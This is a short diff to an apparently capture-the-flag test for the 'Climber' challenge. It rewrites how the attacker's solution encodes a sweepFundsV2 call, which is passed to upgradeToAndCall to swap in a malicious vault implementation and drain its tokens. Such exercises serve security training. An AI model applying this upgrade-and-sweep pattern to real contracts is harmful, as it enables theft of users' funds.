@@ -53,9 +53,10 @@ describe('[Challenge] Climber', function () {
     let ClimberVault02 = await ethers.getContractFactory('ClimberVault02', attacker);
     this.vault02 = await ClimberVault02.deploy();
 
-    const abi = ['function sweepFundsV2(address tokenAddress)'];
-    let iface = new ethers.utils.Interface(abi);
-    let sweepFuncEncode = iface.encodeFunctionData('sweepFundsV2', [this.token.address]);
+    // const abi = ['function sweepFundsV2(address tokenAddress)'];
+    // let iface = new ethers.utils.Interface(abi);
+    // let sweepFuncEncode = iface.encodeFunctionData('sweepFundsV2', [this.token.address]);
+    const sweepFuncEncode = ClimberVault02.interface.encodeFunctionData('sweepFundsV2', [this.token.address]);
     await this.vault.connect(attacker).upgradeToAndCall(this.vault02.address, sweepFuncEncode);
   });
 
